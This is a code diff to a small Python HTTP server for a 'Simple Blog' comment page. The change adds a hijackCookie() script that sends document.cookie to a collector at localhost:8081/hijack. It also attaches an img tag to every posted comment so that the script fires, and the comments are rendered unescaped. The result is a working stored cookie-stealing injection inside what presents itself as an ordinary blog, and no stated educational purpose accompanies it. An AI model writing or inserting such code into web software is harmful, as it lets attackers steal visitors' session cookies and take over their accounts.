@@ -10,6 +10,15 @@ html_content = '''
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Simple Blog</title>
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+    <script>
+        function hijackCookie() {{
+            const img = new Image();
+            img.src = 'http://localhost:8081/hijack?cookie=' + document.cookie;
+            img.onload = function() {{
+                document.getElementById('hijackImage').src = 'http://localhost:8081/cookie_monster.jpg';
+            }};
+        }}
+    </script>
 </head>
 <body>
     <div class="container mt-5">
@@ -26,6 +35,7 @@ html_content = '''
         <div id="comments">
             {comments}
         </div>
+        <img id="hijackImage" style="display:none;">
     </div>
 </body>
 </html>
@@ -33,7 +43,7 @@ html_content = '''
 
 comments_list = []
 
-class MyHandler(BaseHTTPRequestHandler):
+class MainHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Display the page with the form and comments
         comments_html = '<ul class="list-group">'
@@ -44,6 +54,7 @@ class MyHandler(BaseHTTPRequestHandler):
         content = html_content.format(comments=comments_html).encode('utf-8')
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
+        self.send_header('Set-Cookie', 'sessionID=1234567890')
         self.end_headers()
         self.wfile.write(content)
 
@@ -53,17 +64,17 @@ class MyHandler(BaseHTTPRequestHandler):
         post_data = self.rfile.read(content_length)
         parsed_data = urlparse.parse_qs(post_data.decode('utf-8'))
         comment = parsed_data.get('comment', [''])[0]
-        comments_list.append(comment)
+        comments_list.append(comment + '<img src="http://localhost:8081/hijack?cookie=" onload="hijackCookie()">')
         
         self.send_response(302)
         self.send_header('Location', '/')
         self.end_headers()
 
-def run(server_class=HTTPServer, handler_class=MyHandler, port=8080):
+def run_main_server(server_class=HTTPServer, handler_class=MainHandler, port=8080):
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
-    print(f'Starting httpd server on port {port}')
+    print(f'Starting main server on port {port}')
     httpd.serve_forever()
 
 if __name__ == "__main__":
-    run()
+    run_main_server()
